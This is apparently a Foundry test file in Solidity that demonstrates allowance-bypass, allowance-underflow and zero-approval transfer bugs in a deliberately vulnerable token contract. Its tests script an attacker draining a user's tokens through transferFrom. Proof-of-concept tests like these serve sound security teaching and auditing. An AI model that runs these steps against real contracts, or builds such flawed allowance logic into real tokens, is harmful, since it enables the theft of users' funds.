// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A18.sol";

contract VulnerableTokenTest is Test {
    VulnerableToken token;
    address admin = address(0x1);
    address user = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        token = new VulnerableToken();
        vm.prank(admin);
        token.transfer(user, 1000e18);
    }

    function testAllowanceBypass() public {
        // 1. User approves attacker for 100 tokens
        vm.prank(user);
        token.approve(attacker, 100e18);
        assertEq(token.allowance(user, attacker), 100e18);

        // 2. Attacker transfers 500 tokens (more than allowance)
        vm.prank(attacker);
        token.transferFrom(user, attacker, 500e18);

        // 3. Attacker stole tokens despite insufficient allowance
        assertEq(token.balanceOf(attacker), 500e18);
        assertEq(token.balanceOf(user), 500e18);
    }

    function testAllowanceUnderflow() public {
        // 1. User approves attacker for 100 tokens
        vm.prank(user);
        token.approve(attacker, 100e18);

        // 2. Attacker transfers 500 tokens (causes underflow)
        vm.prank(attacker);
        token.transferFrom(user, attacker, 500e18);

        // 3. Check allowance underflow
        uint256 newAllowance = token.allowance(user, attacker);
        assertGt(newAllowance, 2**255); // Very large number
    }

    function testZeroAllowanceExploit() public {
        // 1. Attacker transfers without any approval
        vm.prank(attacker);
        token.transferFrom(user, attacker, 100e18); // Should revert but doesn't

        // 2. Attacker gets tokens
        assertEq(token.balanceOf(attacker), 100e18);
    }
}